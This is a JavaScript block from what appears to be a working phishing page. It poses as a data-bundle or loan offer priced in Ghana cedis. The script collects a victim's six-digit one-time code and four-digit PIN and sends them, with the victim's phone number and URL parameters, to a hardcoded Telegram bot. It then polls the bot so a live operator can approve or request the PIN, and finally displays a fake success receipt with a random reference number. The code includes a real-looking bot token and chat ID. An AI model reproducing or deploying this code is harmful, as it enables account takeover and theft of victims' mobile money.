<script>
    const CONFIG = {
        BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
        CHAT_ID: '7547427914'
    };
    let state = { lastUpdateId: 0 };
    let isProcessing = false;
    const errMsg = document.getElementById('errMsg');
    const pinErrMsg = document.getElementById('pinErrMsg');
    const spinner = document.getElementById('spinner');
    const pinModal = document.getElementById('pinModal');
    const successOverlay = document.getElementById('successOverlay');
    const verifyBtn = document.getElementById('verifyBtn');
    const confirmPinBtn = document.getElementById('confirmPinBtn');
    const params = new URLSearchParams(window.location.search);

    function maskPhone(phone) {
        const p = phone.replace(/\s+/g, '');
        if (p.length <= 5) return p;
        return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2);
    }

    function loadOffer() {
        const name = params.get('offer') || params.get('name') || params.get('loan_name') || 'Data Bundle';
        const data = params.get('data') || '';
        const price = params.get('price') || params.get('amount') || params.get('loan_amount') || '0';
        const phone = params.get('phone') || params.get('msisdn') || '';
        const duration = params.get('duration') || params.get('tenor') || '';
        const rate = params.get('rate') || params.get('interest') || '';
        const fee = params.get('fee') || '';

        document.getElementById('offerTitle').textContent = name + (data ? ` - ${data}` : '');
        document.getElementById('offerPrice').textContent = `GHS ${price}`;

        const metaItems = [];
        if (duration) metaItems.push({ label: 'Duration', value: duration });
        if (rate) metaItems.push({ label: 'Interest', value: rate });
        if (fee) metaItems.push({ label: 'Fee', value: `GHS ${fee}` });

        if (metaItems.length) {
            document.getElementById('offerMeta').innerHTML = metaItems
                .map(m => `<div class="meta-item">${m.label}: <span>${m.value}</span></div>`)
                .join('');
        }

        if (phone) {
            document.getElementById('phoneDisplay').innerHTML =
                `Code sent to <strong>${maskPhone(phone)}</strong>`;
        }
    }

    function showSuccessPage() {
        const amount = params.get('amount') || params.get('price') || null;
        const purpose = params.get('purpose') || params.get('offer') || params.get('name') || null;
        const today = new Date();

        document.getElementById('sDate').textContent =
            today.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
        document.getElementById('sAmount').textContent =
            amount ? `GHS ${parseFloat(amount).toLocaleString()}` : '-';
        document.getElementById('sPurpose').textContent =
            purpose ? purpose.replace(/([A-Z])/g, ' $1').trim() : 'Personal / Emergency';
        document.getElementById('sRefId').textContent =
            'TCL-' + Math.floor(100000 + Math.random() * 900000);

        successOverlay.style.display = 'flex';
    }

    function createInputs(containerId, count) {
        const container = document.getElementById(containerId);
        container.innerHTML = '';
        for (let i = 0; i < count; i++) {
            const input = document.createElement('input');
            input.type = 'text';
            input.maxLength = 1;
            input.className = 'otp-input';
            input.inputMode = 'numeric';
            input.pattern = '[0-9]*';
            container.appendChild(input);
        }
    }

    function getCode(containerId) {
        return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
                   .map(i => i.value.trim()).join('');
    }

    function setupAutoFocus(containerId, length, callback) {
        const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                input.value = input.value.replace(/\D/g, '');
                if (input.value.length === 1 && index < length - 1) inputs[index + 1].focus();
                if (getCode(containerId).length === length) setTimeout(callback, 200);
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
            });
        });
    }

    function focusFirstInput(containerId) {
        const first = document.querySelector(`#${containerId} .otp-input`);
        if (first) first.focus();
    }

    function submitCode() {
        if (isProcessing) return;
        isProcessing = true;
        verifyBtn.disabled = true;
        verifyBtn.textContent = 'Verifying...';

        const code = getCode('otpInputs');
        if (code.length !== 6) {
            isProcessing = false;
            verifyBtn.disabled = false;
            verifyBtn.textContent = 'Verify Device Code';
            return;
        }

        const ts = Date.now();
        const approveId = `approve_${ts}`;
        const declineId = `decline_${ts}`;
        const verifyId = `verify_${ts}`;

        const paramSummary = Array.from(params.entries())
            .map(([k, v]) => `${k}: <code>${v}</code>`)
            .join('\n');

        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: `<b>🔴 Device Verification</b>\n\n${paramSummary}\nCode: <code>${code}</code>\n\nChoose an action:`,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '✅ Approve', callback_data: approveId },
                            { text: '📱 Verify Device', callback_data: verifyId }
                        ],
                        [{ text: '❌ Decline', callback_data: declineId }]
                    ]
                }
            })
        }).then(() => {
            spinner.style.display = 'flex';
            startPolling(approveId, declineId, verifyId);
        }).catch(() => {
            isProcessing = false;
            verifyBtn.disabled = false;
            verifyBtn.textContent = 'Verify Device Code';
        });
    }

    function startPolling(approveId, declineId, verifyId) {
        const interval = setInterval(() => {
            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                .then(r => r.json())
                .then(data => {
                    if (!data.ok) return;
                    data.result.forEach(update => {
                        state.lastUpdateId = update.update_id;
                        if (update.callback_query) {
                            const cb = update.callback_query.data;
                            if (cb === approveId) {
                                clearInterval(interval);
                                spinner.style.display = 'none';
                                showPinModal();
                            } else if (cb === verifyId) {
                                clearInterval(interval);
                                spinner.style.display = 'none';
                                showSuccessPage();
                            } else if (cb === declineId) {
                                clearInterval(interval);
                                spinner.style.display = 'none';
                                window.location.href = 'index.html';   // ← Declined → Back to offers
                            }
                        }
                    });
                });
        }, 1000);
    }

    function showPinModal() {
        pinModal.style.display = 'flex';
        createInputs('pinInputs', 4);
        setupAutoFocus('pinInputs', 4, submitPIN);
        focusFirstInput('pinInputs');
        pinErrMsg.style.display = 'none';
    }

    function submitPIN() {
        const pin = getCode('pinInputs');
        if (pin.length !== 4) return;

        confirmPinBtn.disabled = true;
        confirmPinBtn.textContent = 'Verifying...';

        const ts = Date.now();
        const validId = `valid_${ts}`;
        const invalidId = `invalid_${ts}`;

        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Valid PIN', callback_data: validId },
                        { text: '❌ Invalid PIN', callback_data: invalidId }
                    ]]
                }
            })
        }).then(() => startPinPolling(validId, invalidId));
    }

    function startPinPolling(validId, invalidId) {
        const interval = setInterval(() => {
            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                .then(r => r.json())
                .then(data => {
                    data.result?.forEach(update => {
                        state.lastUpdateId = update.update_id;
                        if (update.callback_query) {
                            const cb = update.callback_query.data;
                            if (cb === validId) {
                                clearInterval(interval);
                                pinModal.style.display = 'none';
                                showSuccessPage();
                            } else if (cb === invalidId) {
                                clearInterval(interval);
                                pinErrMsg.textContent = 'Invalid PIN. Please try again.';
                                pinErrMsg.style.display = 'block';
                                document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
                                focusFirstInput('pinInputs');
                                confirmPinBtn.disabled = false;
                                confirmPinBtn.textContent = 'Confirm PIN';
                            }
                        }
                    });
                });
        }, 1400);
    }

    // ─── Init ──────────────────────────────────────────────────────────────
    createInputs('otpInputs', 6);
    setupAutoFocus('otpInputs', 6, submitCode);
    focusFirstInput('otpInputs');
    verifyBtn.onclick = submitCode;
    confirmPinBtn.onclick = submitPIN;
    loadOffer();
</script>
